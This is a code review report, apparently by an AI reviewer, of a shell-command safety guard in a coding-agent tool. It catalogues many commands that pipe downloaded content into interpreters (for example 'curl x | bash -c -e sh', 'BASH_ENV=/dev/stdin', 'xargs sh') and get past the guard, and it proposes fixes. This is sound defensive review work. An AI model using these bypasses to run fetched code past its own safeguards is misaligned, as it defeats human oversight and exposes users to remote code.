---
phase: quick-261013-sit
reviewed: 2026-10-13T13:15:40Z
depth: deep
files_reviewed: 38
files_reviewed_list:
  - .pi/extensions/execute/index.ts
  - .pi/extensions/grill/index.ts
  - .pi/extensions/grill/scorecard.ts
  - .pi/extensions/plan-ceremony/index.ts
  - .pi/extensions/plan-ceremony/plan-schema.ts
  - .pi/extensions/providers/fallback.ts
  - .pi/extensions/quality/index.ts
  - .pi/extensions/review/index.ts
  - .pi/extensions/review/mr.ts
  - .pi/extensions/routing/agent-overrides.ts
  - .pi/extensions/routing/index.ts
  - .pi/extensions/routing/modes.ts
  - .pi/extensions/safety/branches.ts
  - .pi/extensions/safety/index.ts
  - .pi/extensions/safety/infra.ts
  - .pi/extensions/safety/shell.ts
  - .pi/extensions/safety/subagents.ts
  - .pi/extensions/workflows/index.ts
  - .pi/lib/settings.ts
  - docs/QUALITY.md
  - docs/ROUTING.md
  - docs/SAFETY.md
  - docs/WORKFLOWS.md
  - tests/fixtures/evasion-corpus.ts
  - tests/integration/ceremony-gates.test.ts
  - tests/integration/fallback-chain.test.ts
  - tests/integration/mode-switch.test.ts
  - tests/integration/quick-workflow.test.ts
  - tests/integration/review-command.test.ts
  - tests/unit/agent-overrides.test.ts
  - tests/unit/default-mode.test.ts
  - tests/unit/infra-policy.test.ts
  - tests/unit/ky-profile-flag.test.ts
  - tests/unit/planner-pin-session.test.ts
  - tests/unit/protected-branches.test.ts
  - tests/unit/shell-deny-list.test.ts
  - tests/unit/subagent-guard.test.ts
  - tests/unit/workflow-budgets.test.ts
findings:
  critical: 6
  warning: 9
  info: 4
  total: 19
status: issues_found
---

# Phase quick-261013-sit: Code Review Report

**Reviewed:** 2026-10-13T13:15:40Z
**Depth:** deep
**Files Reviewed:** 38
**Status:** issues_found

## Narrative Findings (AI reviewer)

## Summary

I reviewed the diff `b2640d0..HEAD`, excluding `.planning/`. For the pipe rule I did not rely on reading alone. I ran `canonicalise()` from `.pi/extensions/safety/shell.ts` directly (Node 24 type stripping, script in the session scratchpad) against about 300 candidate commands. I then ran the most important bypasses for real with a harmless `echo`/`print` payload in Git Bash (bash, perl, python, node).

Before this change, any code runner on a pipe was refused. The new `stdinIsCode` narrowing reopens several paths where stdin is executed as code, and the guard allows each of them. Each one below was proven with `canonicalise` returning `ok`. The ones marked "executed" also ran a payload read from stdin on this machine.

- The `-c`/`-e` scan only reads the first inline-code word, and stops scanning there:
  - `bash -c -e sh` (executed)
  - `sh -c -- sh` (executed)
  - `perl -e '1;' -e 'eval join "",<STDIN>'` (executed)
  - `node -e 1 -i` (executed)
- Interpreter startup environment variables are ignored:
  - `BASH_ENV=/dev/stdin bash x.sh` (executed)
  - `NODE_OPTIONS=--require=/dev/stdin`
  - `RUBYOPT=-r/dev/stdin`
  - `export PYTHONINSPECT=1`
- An option value written in the same word as the option is never checked for a stdin alias:
  - `node --require=/dev/stdin`
  - `ruby -r/dev/stdin`
  - `perl -M'strict;eval<STDIN>'` (executed)
  - `php -d auto_prepend_file=php://stdin`
- `php://stdin` is not treated as a stdin alias:
  - `php -f php://stdin`
- The evaluator word list and the stdin-module list have gaps:
  - `python -c 'import code; code.interact()'` (executed)
  - `python -m asyncio` (executed)
  - `perl -e 'require "/dev/stdin"'` (executed)
  - `perl -pe 's/(.*)/$1/ee'` (executed)
  - `ruby -e 'binding.irb'`
- Separately, and probably older than this diff (`wrappedRefusal` is unchanged), `curl x | xargs sh` and `awk -f /dev/stdin` are allowed and executed stdin.

The branch, subagent, budget, fallback and routing changes are mostly sound. Their main problems:
- **Settings parsing:** BOM-encoded or malformed settings drop user-added protected branches without blocking anything.
- **Subagent guard fallback:** the fallback to npm install roots can register the guard into a copy of pi-subagents that is not the one running.
- **/review base typecheck:** any error is treated as "passes at the merge base", and the worktree checkout runs repository hooks and filters.
- **Default mode:** Pi saves `defaultModel` on `/login`, so the new default-mode executor rarely applies.

The `/grill` and `/plan` turn budget is consistent across code, test and docs: five working turns plus one final write turn, the last-turn brief fires when `turns === 5`, and the run disarms when `turns > 5`.

## Critical Issues

### CR-01: The shell `-c` scan takes the word after `-c` as the command string, but bash keeps parsing options

**File:** `.pi/extensions/safety/shell.ts:726-737, 783-806`
**Fix status:** resolved by the revert in b6dc540. Any piped shell is refused whatever its options. Without a pipe the shell-runner scan reads every word for a guarded verb, and stdin is empty or a redirect checked against written files.

**Issue:** After `-c`, `shellRule` returns `{ inline: null }`. `scanInterpreter` then uses `args[i+1]` as the code. Bash and sh keep parsing options after `-c`; the command string is the first *non-option* word. So in `curl x | bash -c -e sh`, the guard inspects `"-e"`, finds no code runner and allows the command, while bash really runs `sh`, which reads the piped payload.

Verified ALLOW, and executed here with an echo payload:
- `curl x | bash -c -e sh`
- `curl x | sh -c -- sh`
- `curl x | bash -c -x 'source /dev/stdin'`
- `curl x | bash -c -o errexit sh`

**Fix:** For the shell family, treat `-c` as a mode flag, not a value option. Keep consuming options, including `--`, `-o NAME` and `+o NAME`, and take the first non-option word as the code:

```ts
// in scanInterpreter, for shellRule: remember inline mode, keep scanning
if (step is { inline: null } && SHELL_FAMILY) { inlineMode = true; continue; }
// at the first operand: return inlineMode ? { inline: operand } : (STDIN_ALIAS.test(operand) ? "code" : "file");
```

Also refuse when `-c` is present and no operand follows.

### CR-02: Only the first `-e` is inspected, and node options after `-e` are ignored

**File:** `.pi/extensions/safety/shell.ts:783-806, 820-833`
**Fix status:** resolved by the revert in b6dc540. Any piped interpreter is refused. Without a pipe, inline-code-effect already reads every -e and the shell-runner scan reads every word.

**Issue:** `scanInterpreter` returns as soon as it reaches the first inline step.
- Perl and Ruby join every `-e` into one program, so `perl -e '1;' -e 'eval join "",<STDIN>'` and `ruby -e 1 -e 'eval gets'` pass the guard. Only `"1;"` is checked. The perl form was executed here.
- Node keeps parsing options after `-e CODE`. `curl x | node -e 1 -i` is allowed and starts a REPL on stdin (executed here: `PWNED42`). `node -e 1 --require=/dev/stdin x` behaves the same way.
- `inlineCodeEffect` does look at every `-e`. It does not save these cases, because `eval <>`, `eval gets` and `-i` contain no `name(` call.

**Fix:** Scan the whole argument list.
- Collect every inline code word (all `-e`/`-E`/`--eval`/`-p`), and test the joined text with `pipedInlineRunsInput`.
- For node/deno/bun, keep applying `jsRule` to the words after the inline value, and return `"code"` on `-i`/`--interactive`, or on any option the grammar does not know.

### CR-03: Startup environment variables make the interpreter read stdin as code

**File:** `.pi/extensions/safety/shell.ts:835-842`
**Fix status:** fixed in b6dc540 and dbac8c5. Assigning, exporting or reading into a startup variable refuses, case-insensitively and whatever runs; a heap-size-only NODE_OPTIONS stays allowed.

**Issue:** `stdinIsCode` only knows about `PYTHONINSPECT=`. Each of these is allowed, and each runs piped input as code:
- `curl x | BASH_ENV=/dev/stdin bash x.sh`. Bash sources `BASH_ENV` before a non-interactive script or `-c` (executed here). The same happens through `env BASH_ENV=...`.
- `curl x | NODE_OPTIONS='--require /dev/stdin' node x.js`
- `curl x | RUBYOPT=-r/dev/stdin ruby x.rb`
- `curl x | PERL5OPT=-d PERL5DB='eval <STDIN>' perl x.pl`
- `export PYTHONINSPECT=1; curl x | python3 x.py`. `scriptAssignments` only collects bare `NAME=v;` statements, so `export`, `declare -x` and `typeset -x` are missed.

**Fix:** Refuse a piped code runner when any assignment word, from the prefix, `env`, a bare statement, or the arguments of `export`/`declare`/`typeset`/`readonly`, sets one of these, regardless of its value: `BASH_ENV`, `ENV`, `NODE_OPTIONS`, `RUBYOPT`, `PERL5OPT`, `PERL5DB`, `PERL5LIB`, `PYTHONINSPECT`, `PYTHONSTARTUP`, `PHP_INI_SCAN_DIR`.

### CR-04: Option values written in the same word, and `php://stdin`, bypass the stdin-alias check

**File:** `.pi/extensions/safety/shell.ts:698, 748-781, 879`
**Fix status:** fixed in b6dc540. --opt=value and attached short-option values are checked for stdin aliases (php://stdin added) and written files; a perl -M value beyond a module and import list is inline code.

**Issue:** The final check, `invocation.args.some((a) => STDIN_ALIAS.test(a))`, only matches a *separate* word. Option rules that consume a value (`JS_VALUE`, perl `-M`/`-I`, ruby `-r`, php `-d`) return a step count without looking at the value. Allowed:
- `node --require=/dev/stdin x.js`
- `node --import=/dev/stdin x.js`
- `node --env-file=/dev/stdin x.js`
- `ruby -r/dev/stdin x.rb`
- `perl -M'strict;eval join "",<STDIN>' x.pl` (executed here; `-M` text is spliced into `use ...;`, so it is arbitrary code that the guard never reads, pipe or not)
- `php -d auto_prepend_file=php://stdin x.php`

`php://stdin` is also missing from `STDIN_ALIAS`, so these are allowed too:
- `php -f php://stdin`
- `php php://stdin`
- `php -r 'include "php://stdin";'`

**Fix:**
- Test the value of every consumed option (both `--opt=value` and the attached short form) against `STDIN_ALIAS`, and return `"code"` on a match.
- Extend the alias pattern: `/^(-|\/dev\/stdin|\/dev\/fd\/\d+|\/proc\/[^/]+\/fd\/\d+|php:\/\/(stdin|fd\/0))$/i`, and search for it as a substring inside option values.
- Treat perl `-M`/`-m` values containing `;`, `(` or whitespace as inline code: route them through `inlineCodeEffect`/`pipedInlineRunsInput`, or refuse them.

### CR-05: The evaluator word list and the stdin-module list miss common interactive evaluators

**File:** `.pi/extensions/safety/shell.ts:709, 718-720, 835-842`
**Fix status:** resolved by the revert in b6dc540; the evaluator and module word lists are gone. Without a pipe stdin carries no code; inline code naming a same-command-written file (require "w.pl") is refused in b6dc540.

**Issue:**
- Each of these passes the guard and runs piped input as code:
  - `curl x | python3 -c 'import code; code.interact()'` (executed)
  - `curl x | python3 -c 'breakpoint()'`
  - `curl x | python3 -c 'import pdb; pdb.set_trace()'`
  - `curl x | python3 -c 'import runpy; runpy.run_path("/dev/stdin")'`
  - `curl x | perl -e 'require "/dev/stdin"'` (executed)
  - `curl x | perl -pe 's/(.*)/$1/ee'` (executed; `/ee` evaluates each input line)
  - `curl x | ruby -e 'binding.irb'`
  - `curl x | ruby -e 'IRB.start'`
  - `curl x | ruby -rpry -e 'binding.pry'`
- Separately, `curl x | python3 -m asyncio` is allowed and is a REPL over stdin (executed). `STDIN_CODE_MODULES` lacks `asyncio`. Note that SAFETY.md's documented residual covers only inline code, not `-m` modules.

**Fix:**
- Add these names to `PIPED_INLINE_EVAL`: `interact`, `InteractiveConsole`, `breakpoint`, `set_trace`, `pdb`, `runpy`, `run_path`, `run_module`, `irb`, `IRB`, `pry`, `binding`, `require` (perl and ruby), `send`, `public_send`, `__send__`, and a perl `s///…ee` flag pattern.
- Add `asyncio` to `STDIN_CODE_MODULES`.

The deeper problem is that a word list can always be extended around. Consider refusing *any* piped `-c`/`-e` whose code reads stdin (`stdin`, `<STDIN>`, `<>`, `gets`, `input(`, `readFileSync(0`, `process.stdin`) and also names something outside a short allow-list (`json`, `print`, `len`, `count`, `split`). That is an allow-list instead of a deny-list.

### CR-06: An input-driven runner hands stdin-controlled arguments to an interpreter, and `awk -f`/`sed -f` read their program from stdin

**File:** `.pi/extensions/safety/shell.ts:985-993` (`wrappedRefusal`), `694-696` (`CODE_RUNNER_NAMES`)
**Fix status:** fixed in b6dc540 (xargs/parallel code runners need a fixed script operand; awk/sed -f from stdin or a written file) and dbac8c5 (option clusters, long-option prefixes, find -exec placeholders).

**Issue:** This is probably pre-existing, because `wrappedRefusal` is unchanged in this diff. It is the same threat the pipe rule exists for.
- `curl x | xargs sh`, `xargs bash`, `xargs python3`, `xargs node` and `xargs perl` are all allowed. The piped bytes become argv, so `-c 'git push …'` from stdin runs (executed here: `echo "-c 'echo PWNED'" | xargs sh`).
- `curl x | awk -f /dev/stdin` / `awk -f -` and `sed -f /dev/stdin` / `sed -f -` are allowed. awk and sed are not code runners here, so the guard never sees the program, and awk's `system()` and sed's `e` both run commands (awk executed here).

**Fix:**
- In `wrappedRefusal`, refuse any wrapped code runner whose invocation could take a script or `-c` from the appended input names. In practice: refuse every `isCodeRunner` wrapped by `xargs`/`parallel` unless it has a fixed script-file operand and none of `-I`/`{}`.
- In `commandStringProgram`, refuse `awk`/`gawk`/`mawk`/`nawk`/`sed` with `-f`/`--file` whose value matches `STDIN_ALIAS`.

## Warnings

### WR-01: Many interpreters and wrappers on a pipe are not code runners, so stdin reaches them unseen

**File:** `.pi/extensions/safety/shell.ts:692-696`
**Fix status:** fixed in b6dc540 (REPLs, pass-through runners, uv/poetry/pipenv/conda run, sudo -s/-i on a pipe) and dbac8c5 (sudo -s with a written stdin file). SAFETY.md calls the list a deny-list with known gaps.

**Issue:** Each of these is allowed on a pipe, and each reads code from stdin:
- Pass-through runners that are not resolved as wrappers: `uv run python`, `poetry run python`, `pipenv run python`, `conda run python`, `rlwrap python3`.
- Commands that are in `SHELL_RUNNERS` but are not wrappers: `strace -f sh`, `flock l sh`, `watch sh`, `script -q /dev/null`.
- Shells started by privilege tools: `sudo -s`, `sudo -i`, `su`.
- Interpreters and REPLs that are not listed: `tsx`, `ts-node`, `ipython`, `irb`, `pry`, `julia`, `R`, `tclsh`, `expect`, `jshell`, `pythonw`, `jython`, `graalpy`, `micropython`.
- Tools whose input language can run shell commands: `sqlite3` (`.shell`), `psql` (`\!`), `mysql` (`system`), `ed` (`!cmd`), `dc` (`!`).

This is pre-existing, but the new docs promise "refused only when its stdin would be its code". Users will read that as complete.

**Fix:**
- Add `uv run`, `poetry run`, `pipenv run`, `conda run`, `rlwrap`, `strace`, `flock` and `watch` to `WRAPPER_GRAMMARS`, so the real executable is reached.
- Treat `sudo -s`/`-i` and bare `su` as a shell.
- Add the listed REPLs and shell-capable tools to `ALWAYS_STDIN_CODE` when they are piped.
- Document the list as a deny-list with known gaps.

### WR-02: `exec 0<file` after a same-command write is not tracked

**File:** `.pi/extensions/safety/shell.ts:867-879`
**Fix status:** fixed in b6dc540 and dbac8c5. exec 0< a written file, also behind builtin or command, refuses a later code runner.

**Issue:** `curl -o p.py URL; exec 0<p.py; python3` is allowed. `exec`'s input redirect rebinds stdin for later commands, but `stdinFiles` only reads the runner's *own* redirects, and the runner is not piped.

**Fix:** When any `exec` (or a bare redirect-only command) has a `<`/`<>`/`<&` redirect, add its targets to the read set. Refuse later code runners with no script operand when a target is written in the same command.

### WR-03: Implicit imports of same-command-written modules are not matched

**File:** `.pi/extensions/safety/shell.ts:854-879`
**Fix status:** fixed in b6dc540. A Python runner refuses when the same command writes any .py, .pyc, .pyd, .so or .pth file.

**Issue:** Each of these is allowed, and each runs the file just written:
- `curl -o json.py x; python3 -c 'import json'`: with `-c`, the current directory comes first on `sys.path`, so the written `json.py` shadows the standard library.
- `curl -o conftest.py x; python3 -m pytest` (and plain `pytest`).
- `curl -o sitecustomize.py x; python3 -m pytest`
- `curl -o foo.pyc x; python3 -m foo`, and the same with `.pyd`/`.so`.

**Fix:**
- For `-c` code, test every `import X`/`from X` name against `writesModule`.
- Treat the written basenames `conftest.py`, `sitecustomize.py`, `usercustomize.py`, `*.pth`, `__init__.py`, `setup.py` and `pyproject.toml` as executed by any python or pytest invocation in the same command.
- Accept `.pyc`, `.pyd` and `.so` (with an ABI tag) in `writesModule`.

### WR-04: The `-m` write match refuses ordinary commands that write logs under a same-named directory

**File:** `.pi/extensions/safety/shell.ts:858-863`
**Fix status:** resolved by the revert in b6dc540. The -m directory match is gone; only Python-importable written files count, so logs under a module-named directory stay allowed.

**Issue:** `segments.slice(0, -1).includes(top)` matches any written path with a directory named after the module, at any depth. These over-refuse with a cause ("runs a file the same command writes") that is false:
- `mkdir -p build && python -m build > build/log.txt`
- `python -m pytest tests > pytest/out.txt`
- `python3 -m mypy src > reports/mypy/latest.txt`
- `python3 -m http.server > http/log`

**Fix:**
- Match a package directory only when the written file inside it is Python code, i.e. it ends in `.py`, `.pyc` or `.so`: `segments.slice(0,-1).includes(top) && /\.(py|pyc|pyd|so)$/.test(segments.at(-1))`.
- Consider requiring the package directory to be the first segment of a relative path.

### WR-05: Malformed or BOM-encoded settings silently remove user-added protected branches

**File:** `.pi/lib/settings.ts:13`, `.pi/extensions/safety/branches.ts:29-41`, `.pi/extensions/safety/index.ts:85, 512-515`
**Fix status:** fixed in 635743e. The reader strips a leading BOM as Pi does (settings-manager.js:269). A settings file that stops parsing, or whose list is not an array, keeps the list that file last gave this process; if it never parsed, the built-ins apply. Either way it warns. A warning raised mid-session is audited and shown once per distinct text. main stays at index 0. Deviation: pushes do not block outright on a malformed file; the last-known-good list is kept instead, as instructed.

**Issue:**
- `readSettingValue` calls `JSON.parse` on the raw text. Pi strips a UTF-8 BOM first (`dist/core/settings-manager.js:269` `JSON.parse(stripBom(content))`). A `settings.json` saved by Notepad or PowerShell 5 has a BOM. Pi accepts that file, but this guard drops `safety.protectedBranches`, so a branch the user protected, such as `production`, becomes pushable.
- `effectiveBranches` is re-read on every tool call (`buildFacts`), but warnings are only shown at `session_start`. If the file is malformed mid-session, for example while the user is editing it, protection drops silently with no audit row.

These are fail-open results for a list the user explicitly asked to tighten.

**Fix:**
- Strip `﻿` before parsing.
- When a settings file exists but does not parse, fail closed for pushes: return `pushProtectedBranches` with a sentinel that makes every push confirm, or block pushes outright until the file parses. Do not quietly fall back to the built-ins.
- Write the warning audit row from `buildFacts` too, de-duplicated per file mtime.

### WR-06: The `/review` base typecheck turns any error into "it passes at the merge base", and a throw in `finally` can replace the result

**File:** `.pi/extensions/quality/index.ts:166-197`, `.pi/extensions/review/index.ts:104-105`
**Fix status:** fixed in efaea31. typecheckAtCommit returns fails, passes or { error }. Only passes refuses. An error becomes a doubt saying the merge base could not be checked, and it names the cause. Cleanup is wrapped so it cannot throw.

**Issue:** `typecheckFailsAtCommit` returns `false` from three paths:
- `git rev-parse` fails.
- `git worktree add` fails. This happens on Windows with paths past MAX_PATH unless `core.longpaths` is set, which is likely in large repos.
- Any exception is thrown.

A base-side `unavailable` result, such as a tsc spawn failure at the base path, also is not `fail`. In every one of these cases, `typecheckBaseline` then refuses with *"the change breaks the typecheck (it passes at the merge base …)"*, which is a false statement. The previous behaviour was a user-decided doubt; now an infrastructure error blocks `/review` with a misleading cause.

Separately, `rmSync(..., { recursive: true, force: true })` inside `finally` can throw EBUSY or EPERM on Windows. Antivirus or indexer locks on freshly checked-out files are common. A throw from `finally` overrides the return value and escapes `typecheckFailsAtCommit`.

**Fix:**
- Return a tri-state, `"fails" | "passes" | { error: string }`. Map the error case to a doubt whose text names the error, rather than a refusal claiming the base passes.
- Wrap the cleanup calls in `try { … } catch { /* record */ }`, so `finally` cannot throw.

### WR-07: The base worktree checkout runs repository hooks, LFS and other filters, and a full checkout

**File:** `.pi/extensions/quality/index.ts:172-175`
**Fix status:** fixed in adca462. worktree add runs with core.hooksPath set to an empty temp dir and the LFS smudge/process filters off (filter.lfs.required=false). The checkout is still a full working tree; QUALITY.md documents this cost.

**Issue:** `git worktree add --detach <dir> <sha>` triggers:
- the repository's `post-checkout` hook, including `core.hooksPath` such as husky;
- smudge filters such as git-lfs, which can download over the network;
- a full working-tree checkout, synchronously, inside the `/review` handler.

On the user's large multi-stack repos, that is a significant time and disk cost on every `/review` where HEAD's typecheck fails. Hook side effects, such as `npm install` from husky or post-checkout scripts, run inside `.git/ky-review-base-*`.

**Fix:** Run the add with hooks and filters disabled:

```ts
git(["-c", "core.hooksPath=/dev/null", "-c", "filter.lfs.smudge=", "-c", "filter.lfs.process=", "-c", "filter.lfs.required=false",
     "worktree", "add", "--detach", dir, sha], top)
```

Also consider limiting the checkout to tsconfig-included paths, or document the cost in QUALITY.md.

### WR-08: Subagent guard resolution falls back to npm roots even when a different pi-subagents is the one loaded, which can fail open

**File:** `.pi/extensions/safety/subagents.ts:92-99`
**Fix status:** fixed in 87173f6. The npm-root fallback is removed. The registry is resolved only from the loaded subagent tool's sourceInfo.path (Pi 1.1.0 ToolInfo.sourceInfo); synthetic paths are skipped. If none resolves, registration fails and launches are refused, with the reason given.

**Issue:** The registry is a module-level singleton inside the pi-subagents copy that is actually loaded. Fallback happens in two cases:
- A `subagent` tool *is* loaded, but `packageRootNamed` cannot find a root named `pi-subagents`. Examples: a vendored copy or git install with a different `name`, or a `package.json` with another name between the entry and the root.
- `getAllTools()` throws or returns nothing.

In either case, `resolveRequiredChildModule` silently uses `~/.pi/agent/npm` or `.pi/npm` if a copy exists there. Registering into that *other* module instance returns `ok: true`, but children launched by the loaded tool never see the guard, so they run unguarded. The plan's own success criterion says resolution "still fails closed".

**Fix:** When `sourcePaths` contains at least one `subagent` tool, return `undefined` if none of them resolves to a registry. Only fall back to the npm roots when no `subagent` tool is loaded, which is the case where launches cannot happen anyway.

### WR-09: The default-mode executor is almost never applied, because Pi saves `defaultModel` on `/login`

**File:** `.pi/extensions/routing/modes.ts:195-214`, `.pi/extensions/routing/index.ts:282-298`
**Fix status:** fixed in 6c933fb (requires human verification). Only --model, --provider or --models opts out. The saved defaultModel/defaultProvider is ignored, because Pi writes it on /login (interactive-mode.js:5078). No settings file is read for this, and there is no explicit-choice notice.

**Issue:** `freshSessionPlan` treats any saved `defaultModel`/`defaultProvider` as an explicit choice. Pi 1.1.0 writes these on provider login: `interactive-mode.js:5078` `setModel(selectedModel, { persist: true })`. It also writes them from the selector's "set default" action. So on most machines, after the first `/login`:
- every fresh session keeps Pi's saved model instead of the routed executor;
- `applyDefaultExecutor` shows a warning on every startup and `/new`.

`savedDefaultModel` also reads the project `.pi/settings.json` even when the project is untrusted. Pi ignores that file in that case (`settings-manager.js:257-260`), so an untrusted repo can suppress the default executor.

**Fix:**
- Treat only CLI flags as explicit. Alternatively, compare the saved default with the routed executor, and treat it as explicit only when it differs from every mode's executor candidate.
- Read project settings only when `ctx.isProjectTrusted()`.

## Info

### IN-01: Over-refusals caused by the new pipe grammar

**File:** `.pi/extensions/safety/shell.ts:704-781, 718-720, 836`
**Fix status:** resolved by the revert in b6dc540; every piped code runner is refused again, by design.

**Issue:** These are refused although stdin is data:
- `X | python3 -sc …`, `-Ic …` and `-Ec …`: clusters ending in `c` are not parsed.
- `X | bash -ce 'cat'`
- `X | perl -F: -lane …`
- `X | node --stack-size=100 s.js`
- `X | python3 --version`
- `X | python3 -c 'import yaml; yaml.safe_load(...)'`: the word `yaml` matches.
- `X | perl -ne 'print if /load/'`: the word `load` inside a regex literal matches.
- `X | busybox grep foo`: `busybox` is in `ALWAYS_STDIN_CODE`, and the applet is not checked.

**Fix:**
- Parse short-option clusters per letter, ending at `c`/`m`/`e`.
- Allow `yaml.safe_load`.
- Resolve the busybox applet before the always-code check.

### IN-02: Comment-rule drift (AGENTS.md)

**File:** `.pi/extensions/quality/index.ts:91`, `.pi/extensions/safety/index.ts:61`, `.pi/extensions/routing/index.ts:281`, `.pi/extensions/safety/shell.ts:700`

**Issue:**
- `execLocalBin`, `subagentSourcePaths` and `applyDefaultExecutor` are not exported but carry JSDoc. AGENTS.md says "JSDoc only on exported API".
- "Programs that read their code from stdin whatever their arguments" is wrong for `busybox`, which resolves to an applet, and for `parallel`, which reads command *arguments* from stdin.

**Fix:** Change these to `//` WHY-only lines, and reword the `ALWAYS_STDIN_CODE` comment.

### IN-03: Case-sensitive `includes` in the protected-branch choice, now reachable through user-added names

**File:** `.pi/extensions/safety/policy.ts:270`

**Issue:** `branches.find((b) => facts.protectedBranches.includes(b))` is case-sensitive. Every other protected-branch comparison lower-cases both sides. If a user adds `Release` and git reports `release` after a known `cd`, the find falls through to `branches[0]`, the session repo's branch. A commit in the `cd` target is then classified against the wrong branch.

**Fix:** `branches.find((b) => facts.protectedBranches.some((p) => p.toLowerCase() === b.toLowerCase()))`.

### IN-04: The `/review` baseline tests never check that the worktree is cleaned up

**File:** `tests/integration/review-command.test.ts:373-420`

**Issue:** Nothing asserts that `.git/ky-review-base-*` is gone, or that `git worktree list` is back to one entry, after either outcome. The error path (worktree add fails) is not tested either.

**Fix:** After each case, assert `readdirSync(join(repo, ".git")).every((n) => !n.startsWith("ky-review-base-"))` and that `git worktree list --porcelain` shows one worktree. Add a case where `sha` does not exist.

---

_Reviewed: 2026-10-13T13:15:40Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
